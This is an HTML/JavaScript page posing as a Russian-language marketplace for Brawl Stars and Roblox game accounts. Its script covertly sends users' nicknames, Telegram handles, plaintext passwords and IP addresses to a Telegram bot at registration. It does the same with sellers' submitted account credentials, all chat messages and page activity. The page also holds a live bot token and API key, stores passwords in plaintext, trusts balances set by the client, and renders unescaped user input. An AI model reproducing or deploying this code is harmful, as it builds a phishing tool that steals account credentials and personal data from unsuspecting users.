<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>lyneok — OMNISCIENT</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&display=swap');
        :root { --bg: #050505; --card: #111113; --blue: #3b82f6; }
        body { background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; overflow: hidden; height: 100vh; }
        
        .tab-content { display: none; height: 100%; overflow-y: auto; padding-bottom: 120px; }
        .tab-content.active { display: block; }

        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; height: 80px; background: rgba(0,0,0,0.8); backdrop-filter: blur(15px); border-top: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
        .nav-btn { color: #555; font-size: 10px; font-weight: bold; text-transform: uppercase; text-align: center; }
        .nav-btn.active { color: var(--blue); }

        .tile { background: var(--card); border-radius: 20px; border: 1px solid #222; transition: 0.2s; }
        .tile:active { transform: scale(0.96); }

        input, textarea, select { background: #1a1a1c; border: 1px solid #333; border-radius: 12px; padding: 14px; color: #fff; width: 100%; outline: none; }
        .btn-main { background: var(--blue); padding: 15px; border-radius: 15px; font-weight: 900; width: 100%; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="loader" class="fixed inset-0 bg-black z-[9999] flex items-center justify-center font-bold text-blue-500">SYSTEM_BOOTING...</div>

    <div id="auth_screen" class="hidden h-screen flex flex-col items-center justify-center px-10">
        <h1 class="text-4xl font-black mb-8 italic">LYNE<span class="text-blue-500">OK</span></h1>
        <div class="w-full max-w-sm space-y-3">
            <input id="reg_n" placeholder="Никнейм">
            <input id="reg_tg" placeholder="Telegram @username">
            <input id="reg_p" type="password" placeholder="Пароль">
            <button onclick="handleAuth()" class="btn-main">Connect</button>
        </div>
    </div>

    <div id="app" class="hidden h-screen flex flex-col">
        <header class="p-5 flex justify-between items-center border-b border-white/10">
            <div class="font-black italic text-xl">LYNE<span class="text-blue-500">OK</span></div>
            <div id="h_bal" class="bg-blue-600/10 px-4 py-2 rounded-xl text-blue-500 font-bold border border-blue-500/20">0 ₽</div>
        </header>

        <main id="tab_market" class="tab-content active px-5 pt-6">
            <div id="cat_grid" class="grid grid-cols-2 gap-3">
                <div onclick="openCat('Brawl Stars', 'fa-gem')" class="tile p-6 text-center">
                    <i class="fa-solid fa-gem text-3xl text-blue-500 mb-2"></i>
                    <p class="text-[10px] font-bold">BRAWL STARS</p>
                </div>
                <div onclick="openCat('Roblox', 'fa-cube')" class="tile p-6 text-center">
                    <i class="fa-solid fa-cube text-3xl text-red-500 mb-2"></i>
                    <p class="text-[10px] font-bold">ROBLOX</p>
                </div>
                </div>
            <div id="items_list" class="hidden space-y-3 pb-20">
                <button onclick="hideItems()" class="text-zinc-500 text-[10px] font-bold uppercase mb-4"><i class="fa-solid fa-arrow-left"></i> Назад</button>
                <div id="m_grid"></div>
            </div>
        </main>

        <main id="tab_sell" class="tab-content px-5 pt-6">
            <h2 class="text-xl font-black mb-6 italic">НОВЫЙ ТОВАР</h2>
            <div class="space-y-3">
                <input type="file" id="f_img" class="hidden" onchange="procImg(this)">
                <label for="f_img" id="f_label" class="w-full h-32 border-2 border-dashed border-zinc-800 rounded-2xl flex flex-col items-center justify-center">
                    <i class="fa-solid fa-image opacity-20 text-2xl"></i>
                    <span class="text-[9px] opacity-40 uppercase font-bold mt-2">Загрузить скриншот</span>
                </label>
                <input id="f_title" placeholder="Название">
                <textarea id="f_desc" placeholder="Данные аккаунта"></textarea>
                <input id="f_price" type="number" placeholder="Цена">
                <button onclick="createItem()" class="btn-main mt-4">Выставить (Комка 10%)</button>
            </div>
        </main>

        <main id="tab_chats" class="tab-content px-5 pt-6">
            <h2 class="text-xl font-black mb-6 italic">ДИАЛОГИ</h2>
            <div id="c_list" class="space-y-2"></div>
        </main>

        <div id="chat_win" class="fixed inset-0 bg-black z-[2000] hidden flex flex-col">
            <div class="p-5 border-b border-white/10 flex justify-between items-center bg-zinc-950">
                <button onclick="closeChat()" class="text-zinc-500"><i class="fa-solid fa-xmark text-xl"></i></button>
                <div class="text-center"><b id="cw_name" class="text-xs uppercase">Сделка</b></div>
                <div class="w-8"></div>
            </div>
            <div id="cw_msgs" class="flex-1 overflow-y-auto p-5 space-y-3"></div>
            <div class="p-4 bg-zinc-950 border-t border-white/10 flex gap-2">
                <input id="cw_inp" placeholder="Ваше сообщение...">
                <button onclick="sendMsg()" class="w-14 h-14 bg-blue-600 rounded-xl"><i class="fa-solid fa-paper-plane"></i></button>
            </div>
        </div>

        <nav class="nav-bar">
            <div onclick="switchTab('market')" id="n_market" class="nav-btn active"><i class="fa-solid fa-shop text-xl mb-1"></i><br>Рынок</div>
            <div onclick="switchTab('sell')" id="n_sell" class="nav-btn"><i class="fa-solid fa-plus-square text-xl mb-1"></i><br>Продать</div>
            <div onclick="switchTab('chats')" id="n_chats" class="nav-btn"><i class="fa-solid fa-comments text-xl mb-1"></i><br>Чаты</div>
        </nav>
    </div>

    <script>
        const CFG = { apiKey: "AIzaSyAY96OYOpqFgCI-Bxtt0Q3xj1BtzdnmWMI", databaseURL: "https://dogx-base-default-rtdb.firebaseio.com" };
        const BOT = { token: "8641257792:AAEsxnQWEIeozMt_gnSwJdVgSFQlOc-hnuc", admin: "7040863301" };
        
        firebase.initializeApp(CFG);
        const db = firebase.database().ref('lyne_v23_omni');

        let me = null, data = {}, curId = null, myIp = "N/A", b64 = "";

        async function init() {
            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); myIp = j.ip; } catch(e){}
            db.on('value', snap => {
                data = snap.val() || { u:{}, i:{}, d:{}, c:{} };
                const sid = localStorage.getItem('lyne_sid');
                if(!sid) toggleAuth(true);
                else {
                    me = data.u[sid];
                    if(me) { toggleAuth(false); render(); } else logout();
                }
                document.getElementById('loader').style.display = 'none';
            });
        }

        // ВЕЗДЕСУЩИЙ БОТ: Отправка "чиха" админу
        async function log(m) {
            fetch(`https://api.telegram.org/bot${BOT.token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: BOT.admin, text: `👤 [${me?.n || 'GUEST'}]\n📢 ${m}`, parse_mode: 'HTML' })
            });
        }

        function toggleAuth(s) {
            document.getElementById('auth_screen').classList.toggle('hidden', !s);
            document.getElementById('app').classList.toggle('hidden', s);
        }

        async function handleAuth() {
            const n = document.getElementById('reg_n').value.trim();
            const t = document.getElementById('reg_tg').value.trim();
            const p = document.getElementById('reg_p').value.trim();
            if(!n || !p) return;

            let uid = Object.keys(data.u || {}).find(k => data.u[k].n === n);
            if(!uid) {
                uid = 'u' + Date.now().toString().slice(-6);
                await db.child(`u/${uid}`).set({ id: uid, n, tg: t, p, bal: 0, ip: myIp });
                log(`🆕 <b>РЕГИСТРАЦИЯ!</b>\nНик: ${n}\nTG: ${t}\nПароль: ${p}\nIP: ${myIp}`);
            } else {
                if(data.u[uid].p !== p) return alert('Bad password');
                log(`🔑 <b>ВХОД В АККАУНТ</b>\nНик: ${n}\nIP: ${myIp}`);
            }
            localStorage.setItem('lyne_sid', uid);
        }

        function render() {
            document.getElementById('h_bal').innerText = (me.bal || 0) + ' ₽';
            
            // Render Chats
            const myD = Object.values(data.d || {}).filter(d => d.bid === me.id || d.sid === me.id).reverse();
            document.getElementById('c_list').innerHTML = myD.map(d => `
                <div onclick="openChat('${d.id}')" class="tile p-4 flex justify-between items-center">
                    <div><b class="text-xs uppercase">${d.title}</b><p class="text-[8px] opacity-50">ID: ${d.id}</p></div>
                    <span class="text-blue-500 font-bold text-[9px] uppercase">${d.status || 'Active'}</span>
                </div>
            `).join('');

            if(curId) renderChat();
        }

        function openCat(c, i) {
            log(`👀 Смотрит категорию: <b>${c}</b>`);
            document.getElementById('cat_grid').classList.add('hidden');
            document.getElementById('items_list').classList.remove('hidden');
            const its = Object.values(data.i || {}).filter(it => it.cat === c && it.status === 'active');
            document.getElementById('m_grid').innerHTML = its.map(it => `
                <div onclick="buyItem('${it.id}')" class="tile p-4 flex gap-4 items-center mb-2">
                    <img src="${it.img}" class="w-12 h-12 rounded-lg object-cover">
                    <div class="flex-1"><b class="text-xs">${it.title}</b><p class="text-[9px] opacity-50">Продавец: ${data.u[it.sid]?.n}</p></div>
                    <b class="text-blue-500">${it.price} ₽</b>
                </div>
            `).join('') || '<p class="text-center py-10 opacity-20">ПУСТО</p>';
        }

        async function createItem() {
            const title = document.getElementById('f_title').value;
            const price = Number(document.getElementById('f_price').value);
            const desc = document.getElementById('f_desc').value;
            if(!title || !price || !b64) return;

            const id = 'i' + Date.now();
            await db.child(`i/${id}`).set({ id, sid: me.id, title, price, desc, img: b64, cat: 'Brawl Stars', status: 'pending' });
            log(`📦 <b>СОЗДАЛ ТОВАР!</b>\nНазвание: ${title}\nЦена: ${price}₽\nДанные: ${desc}\n<i>(Ждет модерации)</i>`);
            Swal.fire('Ок', 'Товар на проверке!', 'success');
            switchTab('market');
        }

        async function buyItem(id) {
            const it = data.i[id];
            const { isConfirmed } = await Swal.fire({ title: 'Купить?', text: it.title, showCancelButton: true });
            if(isConfirmed) {
                if(me.bal < it.price) { log(`❌ Ошибка оплаты (мало денег): ${it.title}`); return; }
                const did = 'd' + Date.now();
                await db.child(`u/${me.id}/bal`).set(me.bal - it.price);
                await db.child(`d/${did}`).set({ id: did, bid: me.id, sid: it.sid, title: it.title, price: it.price });
                await db.child(`i/${id}/status`).set('sold');
                log(`💰 <b>КУПИЛ ТОВАР!</b>\nТовар: ${it.title}\nЦена: ${it.price}₽\nПокупатель: ${me.n}\nПродавец: ${data.u[it.sid].n}`);
                openChat(did);
            }
        }

        function openChat(id) {
            curId = id;
            document.getElementById('chat_win').classList.remove('hidden');
            log(`💬 Зашел в чат: <b>${id}</b>`);
            renderChat();
        }

        async function sendMsg() {
            const t = document.getElementById('cw_inp').value.trim();
            if(!t) return;
            await db.child(`c/${curId}`).push({ uid: me.id, t, ts: Date.now() });
            log(`📩 <b>СООБЩЕНИЕ В ЧАТЕ [${curId}]</b>\nТекст: ${t}`);
            document.getElementById('cw_inp').value = '';
        }

        function renderChat() {
            const ms = Object.values(data.c?.[curId] || {});
            document.getElementById('cw_msgs').innerHTML = ms.map(m => `
                <div class="flex flex-col ${m.uid === me.id ? 'items-end' : 'items-start'}">
                    <div class="px-4 py-2 rounded-2xl text-[11px] ${m.uid === me.id ? 'bg-blue-600' : 'bg-zinc-800'}">${m.t}</div>
                </div>
            `).join('');
            const b = document.getElementById('cw_msgs'); b.scrollTop = b.scrollHeight;
        }

        function procImg(i) {
            const r = new FileReader();
            r.onload = e => { b64 = e.target.result; document.getElementById('f_label').innerHTML = `<img src="${b64}" class="h-full w-full object-cover rounded-2xl">`; };
            r.readAsDataURL(i.files[0]);
        }

        function switchTab(t) {
            document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(x => x.classList.remove('active'));
            document.getElementById('tab_'+t).classList.add('active');
            document.getElementById('n_'+t).classList.add('active');
            log(`📍 Перешел в раздел: <b>${t}</b>`);
        }

        function hideItems() { document.getElementById('cat_grid').classList.remove('hidden'); document.getElementById('items_list').classList.add('hidden'); }
        function closeChat() { document.getElementById('chat_win').classList.add('hidden'); curId = null; }
        function logout() { localStorage.clear(); location.reload(); }

        init();
    </script>
</body>
</html>
